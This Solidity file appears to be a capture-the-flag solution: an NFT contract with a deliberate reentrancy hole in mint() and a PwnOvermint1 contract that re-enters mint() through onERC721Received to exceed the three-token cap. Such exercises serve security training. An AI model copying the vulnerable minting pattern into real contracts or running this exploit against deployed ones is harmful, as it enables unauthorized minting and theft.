// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    // @audit-issue CEI is not respected! Risk of reentrancy!
    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract PwnOvermint1 is
    IERC721Receiver // we cannot for forget the "is IERC721Receiver"
{
    Overmint1 overmint;
    address i_owner;

    constructor(address _overmint) {
        i_owner = msg.sender;
        overmint = Overmint1(_overmint);
    }

    function attack() public {
        require(
            msg.sender == i_owner,
            "Only the owner can call this function!"
        );
        overmint.mint();
    }

    function normalMint() public {
        require(
            msg.sender == i_owner,
            "Only the owner can call this function!"
        );
        overmint.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        require(
            msg.sender == address(overmint),
            "Must come from overmint contract!"
        );
        if (overmint.balanceOf(address(this)) < 5) {
            overmint.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
